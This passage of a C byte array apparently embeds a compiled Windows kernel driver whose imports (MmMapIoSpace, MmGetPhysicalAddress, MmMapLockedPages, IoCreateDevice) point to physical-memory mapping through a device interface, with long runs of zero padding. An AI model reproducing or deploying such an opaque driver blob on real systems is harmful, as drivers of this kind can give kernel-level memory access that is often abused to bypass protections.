		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xA8, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
		0xB0, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xB8, 0x20, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x9E, 0xA4, 0x63, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00,
		0x54, 0x01, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x9E, 0xA4, 0x63, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x7C, 0x24, 0x00, 0x00, 0x7C, 0x12, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00,
		0x80, 0x06, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x80, 0x16, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x30, 0x30, 0x00, 0xC0, 0x16, 0x00, 0x00,
		0xAA, 0x02, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x32, 0x31, 0x00, 0x00, 0x20, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x00, 0x00, 0x00, 0x00, 0x90, 0x20, 0x00, 0x00,
		0x30, 0x00, 0x00, 0x00, 0x2E, 0x30, 0x30, 0x63, 0x66, 0x67, 0x00, 0x00, 0xC0, 0x20, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x2E, 0x67, 0x66, 0x69, 0x64, 0x73, 0x00, 0x00, 0xE0, 0x20, 0x00, 0x00, 0x20, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
		0x74, 0x61, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x80, 0x24, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61,
		0x74, 0x61, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x10, 0x30, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
		0x84, 0x00, 0x00, 0x00, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0x14, 0x50, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
		0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00, 0x28, 0x50, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x50, 0x00, 0x00, 0x84, 0x01, 0x00, 0x00,
		0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x31, 0x00, 0x00, 0x00, 0x00, 0x60, 0x60, 0x00, 0x00, 0xA8, 0x03, 0x00, 0x00,
		0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x0A, 0x00, 0x0F, 0x34, 0x09, 0x00, 0x0F, 0x52, 0x0B, 0x70, 0x21, 0x05, 0x02, 0x00, 0x05, 0x54, 0x08, 0x00,
		0x00, 0x10, 0x00, 0x00, 0x4A, 0x10, 0x00, 0x00, 0x80, 0x24, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x4A, 0x10, 0x00, 0x00, 0x80, 0x24, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00,
		0x06, 0x52, 0x02, 0x70, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x08, 0x00, 0x90, 0x14, 0x00, 0x00, 0xC7, 0x14, 0x00, 0x00, 0xBC, 0x24, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x90, 0x14, 0x00, 0x00, 0xC7, 0x14, 0x00, 0x00, 0xBC, 0x24, 0x00, 0x00,
		0x01, 0x06, 0x02, 0x00, 0x06, 0xB2, 0x02, 0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x4A, 0x10, 0x00, 0x00,
		0x80, 0x24, 0x00, 0x00, 0x4A, 0x10, 0x00, 0x00, 0xCA, 0x13, 0x00, 0x00, 0x90, 0x24, 0x00, 0x00, 0xCA, 0x13, 0x00, 0x00, 0x55, 0x14, 0x00, 0x00, 0xA4, 0x24, 0x00, 0x00, 0x60, 0x14, 0x00, 0x00, 0x89, 0x14, 0x00, 0x00, 0xB4, 0x24, 0x00, 0x00,
		0x90, 0x14, 0x00, 0x00, 0xC7, 0x14, 0x00, 0x00, 0xBC, 0x24, 0x00, 0x00, 0xC7, 0x14, 0x00, 0x00, 0x38, 0x15, 0x00, 0x00, 0xC4, 0x24, 0x00, 0x00, 0x38, 0x15, 0x00, 0x00, 0x64, 0x15, 0x00, 0x00, 0xD8, 0x24, 0x00, 0x00, 0x70, 0x15, 0x00, 0x00,
		0x65, 0x16, 0x00, 0x00, 0xE8, 0x24, 0x00, 0x00, 0x90, 0x16, 0x00, 0x00, 0x95, 0x16, 0x00, 0x00, 0xF8, 0x24, 0x00, 0x00, 0xB0, 0x16, 0x00, 0x00, 0xB6, 0x16, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0xC0, 0x16, 0x00, 0x00, 0x6A, 0x19, 0x00, 0x00,
		0xF0, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x52, 0x00, 0x00,
		0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xE4, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFC, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x4A, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC2, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD6, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEC, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBC, 0x05, 0x4D, 0x6D, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x4D, 0x64, 0x6C, 0x46, 0x6F, 0x72, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x50, 0x6F, 0x6F, 0x6C, 0x00, 0xF6, 0x02, 0x49, 0x6F,
		0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xF1, 0x08, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0xEE, 0x05, 0x4D, 0x6D,
		0x4D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0xCB, 0x05, 0x4D, 0x6D, 0x46, 0x72, 0x65, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0x3C, 0x03,
		0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0x1E, 0x06, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0xD6, 0x05, 0x4D, 0x6D, 0x47, 0x65,
		0x74, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x3E, 0x03, 0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B,
		0x00, 0x00, 0x56, 0x03, 0x49, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xAE, 0x05, 0x4D, 0x6D, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65, 0x6D, 0x6F,
		0x72, 0x79, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x79, 0x43, 0x61, 0x63, 0x68, 0x65, 0x00, 0x00, 0x23, 0x03, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0xEE, 0x00, 0x45, 0x78, 0x46, 0x72,
		0x65, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0x1F, 0x06, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x00, 0x4F, 0x04, 0x49, 0x6F,
		0x66, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x00, 0x2F, 0x03, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B,
		0x00, 0x00, 0xF0, 0x05, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x00, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
